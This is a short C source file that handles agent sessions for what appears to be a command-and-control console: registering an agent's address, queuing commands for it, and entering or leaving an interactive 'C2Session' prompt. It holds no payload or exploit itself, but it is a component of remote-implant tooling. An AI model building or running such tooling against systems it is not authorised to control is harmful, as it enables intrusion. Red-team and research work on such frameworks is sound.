#include "Session.h"
#include <string.h>
#include <stdio.h>

void SessionInit(AgentSession *S)
{
    memset(S, 0, sizeof(*S));
}

void SessionRegister(AgentSession *S, const char *Addr)
{
    if (S->IsActive)
        return;

    S->IsActive = 1;
    strncpy(S->Address, Addr, AddrLen - 1);
    S->Address[AddrLen - 1] = '\0';

    if (S->InSession) {
        printf("\n[*] Agent re-registered from %s\n", S->Address);
        printf("C2Session[%s]> ", S->Address);
        fflush(stdout);
    }
}

void SessionQueueCommand(AgentSession *S, const char *Cmd)
{
    strncpy(S->PendingCommand, Cmd, BufferSize - 1);
    S->PendingCommand[BufferSize - 1] = '\0';
    S->CommandPending = 1;
    S->WaitingResult  = 0;
}

void SessionEnter(AgentSession *S)
{
    S->InSession     = 1;
    S->WaitingResult = 0;
    printf("[*] Entering session with %s\n", S->Address);
    printf("[*] Type 'back' to return to main console.\n");
    printf("C2Session[%s]> ", S->Address);
    fflush(stdout);
}

void SessionLeave(AgentSession *S)
{
    S->InSession     = 0;
    S->WaitingResult = 0;
}

void SessionReset(AgentSession *S)
{
    memset(S, 0, sizeof(*S));
}
